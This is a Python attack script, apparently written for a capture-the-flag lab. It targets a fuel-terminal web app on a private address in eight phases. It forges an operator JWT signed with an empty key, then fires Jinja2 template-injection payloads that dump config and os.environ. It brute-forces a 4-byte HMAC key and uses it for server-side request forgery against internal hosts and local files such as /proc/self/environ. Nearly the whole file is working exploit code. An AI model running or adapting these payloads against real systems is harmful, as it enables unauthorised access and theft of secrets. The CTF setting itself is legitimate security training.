#!/usr/bin/env python3
"""round32 — Register real account, SSTI deep investigation, 4-byte ASCII brute-force"""
import requests, time, json, hmac as hm, hashlib, base64, random, string

CASPI = "http://192.168.242.102:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_op():
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_op()}"}

# ============================================================
print("="*70)
print("PHASE 1: REGISTER A REAL ACCOUNT")
print("="*70)

uid = ''.join(random.choices(string.ascii_lowercase, k=6))
email = f"ctf_{uid}@caspiterminal.kz"
password = f"Ctf{uid}2026!"
company = f"CTF_Team_{uid}"

print(f"  Registering: {email} / {password} / {company}")
try:
    r = S.post(f"{CASPI}/api/auth/register",
        json={"email": email, "password": password, "company": company},
        timeout=10)
    print(f"  Register: [{r.status_code}] {r.text[:200]}")

    if r.status_code == 200 or r.status_code == 201:
        print("  Registration SUCCESS!")
        # Check for Set-Cookie
        print(f"  Cookies: {dict(r.cookies)}")
        print(f"  Headers: {dict(r.headers)}")

        # Try to get JWT from response
        try:
            rd = r.json()
            print(f"  Response data: {json.dumps(rd, indent=2)[:500]}")
        except:
            pass
except Exception as e:
    print(f"  Register error: {e}")

# ============================================================
print("\n"+"="*70)
print("PHASE 2: LOGIN WITH REAL ACCOUNT")
print("="*70)

try:
    r = S.post(f"{CASPI}/api/auth/login",
        json={"email": email, "password": password}, timeout=10)
    print(f"  Login: [{r.status_code}] {r.text[:300]}")
    print(f"  Cookies after login: {dict(S.cookies)}")

    if r.status_code == 200:
        try:
            ld = r.json()
            real_token = ld.get("token","")
            print(f"  Token: {real_token[:80]}...")

            if real_token:
                # Decode JWT payload
                parts = real_token.split(".")
                if len(parts) >= 2:
                    padded = parts[1] + "=" * (4 - len(parts[1]) % 4)
                    payload = json.loads(base64.urlsafe_b64decode(padded))
                    print(f"  JWT payload: {json.dumps(payload, indent=2)}")
        except:
            pass
except Exception as e:
    print(f"  Login error: {e}")

# ============================================================
print("\n"+"="*70)
print("PHASE 3: ACCESS PORTAL WITH REAL AUTH")
print("="*70)

# Try with session cookies from login
for path in ["/portal", "/ops", "/ops/custody", "/ops/diagnostics",
             "/api/auth/me"]:
    try:
        r = S.get(f"{CASPI}{path}", timeout=10)
        title = ""
        if "<title>" in r.text:
            s = r.text.index("<title>")+7
            e = r.text.index("</title>",s) if "</title>" in r.text[s:] else s+50
            title = r.text[s:e]
        print(f"  GET {path}: [{r.status_code}] {title or r.text[:80]}")

        if path == "/portal" and r.status_code == 200:
            import re
            links = re.findall(r'href=["\']([^"\']+)', r.text)
            apis = re.findall(r'["\'](/api/[^"\']+)["\']', r.text)
            scripts = re.findall(r'<script[^>]*>(.*?)</script>', r.text, re.DOTALL)
            print(f"    Links: {links[:15]}")
            print(f"    APIs: {apis}")
            for i, scr in enumerate(scripts):
                if scr.strip() and len(scr.strip()) > 30:
                    print(f"    Script {i}: {scr[:600]}")
            # Print full page if small enough
            if len(r.text) < 6000:
                print(f"\n    Full page:\n{r.text}")
    except Exception as e:
        print(f"  {path}: {e}")

# ============================================================
print("\n"+"="*70)
print("PHASE 4: SSTI DEEP INVESTIGATION")
print("="*70)

# Key question: WHY does {{7*7}} cause timeout?
# Test with different payloads to understand the behavior

def ssti_test(payload, label, timeout=5):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<ticket>
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>{payload}</remarks>
</ticket>'''
    t0 = time.time()
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=timeout)
        elapsed = time.time()-t0
        try:
            d = r.json()
            remarks = d.get("summary",{}).get("remarks","")
            return elapsed, r.status_code, remarks
        except:
            return elapsed, r.status_code, r.text[:100]
    except requests.exceptions.Timeout:
        return time.time()-t0, "TIMEOUT", ""
    except Exception as e:
        return time.time()-t0, "ERR", str(e)[:80]

# 1. Baseline — normal text
t, c, v = ssti_test("normal text", "baseline")
print(f"  'normal text':        {t:.2f}s [{c}] remarks='{v[:50]}'")

# 2. Single brace
t, c, v = ssti_test("{test}", "single brace")
print(f"  '{{test}}':            {t:.2f}s [{c}] remarks='{v[:50]}'")

# 3. Double brace minimal
t, c, v = ssti_test("{{x}}", "double brace", timeout=8)
print(f"  '{{{{x}}}}':              {t:.2f}s [{c}] remarks='{v[:50]}'")

# 4. Double brace with number
t, c, v = ssti_test("{{1}}", "number", timeout=8)
print(f"  '{{{{1}}}}':              {t:.2f}s [{c}] remarks='{v[:50]}'")

# 5. Double brace with string
t, c, v = ssti_test("{{'a'}}", "string", timeout=8)
print(f"  '{{{{\"a\"}}}}':            {t:.2f}s [{c}] remarks='{v[:50]}'")

# 6. Jinja2 comment
t, c, v = ssti_test("{# comment #}", "comment", timeout=8)
print(f"  '{{# comment #}}':     {t:.2f}s [{c}] remarks='{v[:50]}'")

# 7. Jinja2 block
t, c, v = ssti_test("{% if 1 %}yes{% endif %}", "if block", timeout=8)
print(f"  '{{% if 1 %}}yes...':   {t:.2f}s [{c}] remarks='{v[:50]}'")

# 8. Empty double braces
t, c, v = ssti_test("{{}}", "empty braces", timeout=8)
print(f"  '{{{{}}}}':               {t:.2f}s [{c}] remarks='{v[:50]}'")

# 9. Just the open part
t, c, v = ssti_test("{{ ", "open only", timeout=8)
print(f"  '{{{{ ':               {t:.2f}s [{c}] remarks='{v[:50]}'")

# 10. Percent block
t, c, v = ssti_test("{% %}", "pct block", timeout=8)
print(f"  '{{% %}}':             {t:.2f}s [{c}] remarks='{v[:50]}'")

# ============================================================
print("\n"+"="*70)
print("PHASE 5: SSTI EXPLOITATION (IF CONFIRMED)")
print("="*70)

# If any of the above returned rendered output, try to extract secrets
# Use shorter timeout first to see if we get any response

# Try simple expressions that would return quickly
exploits = [
    ("7*7", "{{7*7}}"),
    ("string", "{{'SSTI_CONFIRMED'}}"),
    ("config keys", "{{config.keys()|list}}"),
    ("import os", "{{''.__class__.__mro__[1].__subclasses__()}}"),
    ("lipsum globals", "{{lipsum.__globals__}}"),
    ("cycler", "{{cycler.__init__.__globals__}}"),
    ("get_flashed", "{{get_flashed_messages.__globals__}}"),
    ("url_for globals", "{{url_for.__globals__}}"),
    ("request", "{{request}}"),
    ("request.environ", "{{request.environ}}"),
    ("request.environ PROBE", "{{request.environ.get('PROBE_SECRET','nope')}}"),
    ("config SECRET_KEY", "{{config.get('SECRET_KEY','nope')}}"),
    ("config PROBE", "{{config.get('PROBE_SECRET','nope')}}"),
    ("os.environ", "{{cycler.__init__.__globals__['os'].environ}}"),
]

for label, payload in exploits:
    t, c, v = ssti_test(payload, label, timeout=12)
    if c == "TIMEOUT":
        print(f"  [{label}]: TIMEOUT ({t:.1f}s)")
    elif isinstance(c, int) and c == 200 and v != payload:
        print(f"  [{label}]: RENDERED! → '{v[:300]}' <<<")
    elif isinstance(c, int) and c == 200:
        print(f"  [{label}]: echoed ({t:.1f}s)")
    else:
        print(f"  [{label}]: [{c}] {v[:80]} ({t:.1f}s)")

# ============================================================
print("\n"+"="*70)
print("PHASE 6: SSTI IN OTHER FIELDS")
print("="*70)

# Maybe SSTI works in a different field (reference, carrier)
for field_name in ["reference", "carrier", "tankId", "product"]:
    val_map = {"reference":"r", "tankId":"T-01", "product":"D", "carrier":"C"}
    val_map[field_name] = "{{7*7}}"

    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<ticket>
  <reference>{val_map["reference"]}</reference>
  <tankId>{val_map["tankId"]}</tankId>
  <product>{val_map["product"]}</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{val_map["carrier"]}</carrier>
  <remarks>R</remarks>
</ticket>'''
    t0 = time.time()
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=8)
        elapsed = time.time()-t0
        try:
            d = r.json()
            fval = d.get("summary",{}).get(field_name, d.get("summary",{}).get(field_name.lower(),""))
            rendered = fval != "{{7*7}}"
            print(f"  {field_name}: {elapsed:.2f}s [{r.status_code}] val='{fval[:50]}' {'RENDERED!' if rendered else 'echoed'}")
        except:
            print(f"  {field_name}: {elapsed:.2f}s [{r.status_code}] {r.text[:60]}")
    except requests.exceptions.Timeout:
        print(f"  {field_name}: TIMEOUT ({time.time()-t0:.1f}s)")
    except Exception as e:
        print(f"  {field_name}: ERR {e}")

# ============================================================
print("\n"+"="*70)
print("PHASE 7: BRUTE-FORCE 4-BYTE ASCII HMAC KEY")
print("="*70)

known_url = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
known_sig = bytes.fromhex("5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09")

# Printable ASCII: 32-126 (95 chars)
# 95^4 = 81,450,625 — about 100 seconds based on 3-byte speed
print("  Testing all 4-byte printable ASCII keys (81.5M combinations)...")
print("  Estimated time: ~110 seconds")
t0 = time.time()
found = False
checked = 0

ascii_range = range(32, 127)
for b0 in ascii_range:
    for b1 in ascii_range:
        prefix = bytes([b0, b1])
        for b2 in ascii_range:
            mid = prefix + bytes([b2])
            for b3 in ascii_range:
                key = mid + bytes([b3])
                if hm.new(key, known_url, hashlib.sha256).digest() == known_sig:
                    elapsed = time.time() - t0
                    print(f"\n  FOUND KEY: '{key.decode()}' (hex: {key.hex()}) in {elapsed:.1f}s")
                    found = True
                    break
            if found:
                break
            checked += 95
        if found:
            break
        if checked % (95*95*8) == 0:
            elapsed = time.time() - t0
            pct = checked / (95**4) * 100
            rate = checked / elapsed if elapsed > 0 else 0
            eta = (95**4 - checked) / rate if rate > 0 else 999
            print(f"  Progress: {pct:.1f}% ({checked:,} keys, {elapsed:.0f}s, ETA {eta:.0f}s)", end="\r", flush=True)
    if found:
        break

if not found:
    elapsed = time.time() - t0
    print(f"\n  No 4-byte ASCII key found ({elapsed:.1f}s)")

# ============================================================
if found:
    print("\n"+"="*70)
    print("PHASE 8: SSRF WITH FOUND KEY")
    print("="*70)

    probe_key = key
    targets = [
        "http://gauge-gw.internal:9100/",
        "http://gauge-gw.internal:9100/v1/",
        "http://gauge-gw.internal:9100/v1/config",
        "http://gauge-gw.internal:9100/v1/secret",
        "http://gauge-gw.internal:9100/v1/flag",
        "http://gauge-gw.internal:9100/flag",
        "http://gauge-gw.internal:9100/secret",
        "http://gauge-gw.internal:9100/env",
        "http://gauge-gw.internal:9100/health",
        "http://gauge-gw.internal:9100/metrics",
        "http://gauge-gw.internal:9100/v1/admin",
        "http://gauge-gw.internal:9100/v1/meters/",
        "http://gauge-gw.internal:9100/v1/tanks/",
        "http://127.0.0.1:3000/",
        "http://127.0.0.1:3000/api/auth/me",
        "http://terminal-db:5432/",
        "file:///app/app.py",
        "file:///proc/self/environ",
    ]

    for url in targets:
        sig = hm.new(probe_key, url.encode(), hashlib.sha256).hexdigest()
        try:
            r = S.post(f"{CASPI}/api/ops/probe",
                json={"url": url, "sig": sig},
                headers=AUTH_OP, timeout=10)
            if r.status_code == 200:
                d = r.json()
                body_text = d.get("body","")[:300]
                print(f"  [{d.get('status','')}] {url}")
                print(f"    {body_text}")
            else:
                print(f"  [{r.status_code}] {url}: {r.text[:60]}")
        except Exception as e:
            print(f"  [ERR] {url}: {e}")

print("\n"+"="*70)
print("DONE")
print("="*70)
